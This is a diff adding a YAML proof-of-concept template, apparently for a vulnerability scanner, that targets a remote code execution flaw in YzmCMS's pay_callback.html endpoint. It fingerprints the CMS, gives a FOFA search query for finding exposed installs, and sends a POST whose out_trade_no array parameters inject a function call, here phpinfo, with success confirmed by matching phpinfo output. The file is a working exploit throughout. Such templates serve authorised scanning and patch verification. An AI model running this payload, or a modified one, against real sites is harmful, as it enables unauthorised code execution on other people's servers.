@@ -1,0 +1,21 @@
+id: poc-yaml-yzmcms-pay-callback-html-rce
+info:
+  name: YzmCMS pay_callback.html 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: yzmcms
+  fofa: app="yzmcms"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"YzmCMS内容管理系统")
+- method: POST
+  path: /pay/index/pay_callback.html
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
+  expression: "status_code == 200 && \ncontains(title,\"phpinfo()\") &&\ncontains(body,\"\
+    PHP API\") &&\ncontains(body,\"PHP Extension\")\n"
+variables: {}
+transport: http
